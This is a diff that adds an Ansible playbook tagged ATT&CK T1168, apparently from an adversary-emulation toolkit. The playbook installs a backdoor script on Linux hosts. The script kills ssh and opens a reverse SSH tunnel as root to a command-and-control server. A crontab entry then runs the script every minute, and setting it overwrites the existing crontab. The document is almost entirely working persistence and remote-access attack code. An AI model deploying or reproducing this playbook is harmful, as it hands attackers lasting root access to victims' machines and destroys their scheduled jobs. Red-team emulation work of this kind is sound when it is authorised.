@@ -1,0 +1,23 @@
+# attack_technique: T1168
+# victim public key must be added to authorized_host files on c&c
+# On c&c run: ssh -pREMLIS localhost
+- name: Cron Job
+  hosts: linux
+  tasks:
+          - name: createfile
+            file: path={{ backdoor_script }} state=touch
+          - name: createscript
+            vars:
+                script: {{ backdoor_script }}
+            shell: |
+                echo "killall ssh > /dev/null 2>&1" > {{ backdoor_script }}
+                echo "sleep 5" >> {{ backdoor_script }}
+                echo "REMLIS={{ cnc_port }}" >> {{ backdoor_script }}
+                echo "REMUSER=root" >> {{ backdoor_script }}
+                echo "HOSTS=\"{{ cnc_fqdn }} \"" >> {{ backdoor_script }}
+                echo "ssh -R \${REMLIS}:localhost:22 -N \${HOSTS} -l \${REMUSER}" >> {{ backdoor_script }}
+                chmod 755 {{ backdoor_script }}
+          - name: crontab
+            shell: |
+                crontab -l > /tmp/crontmp
+                echo "* * * * * {{ backdoor_script }}" > /tmp/persistevil && crontab /tmp/persistevil
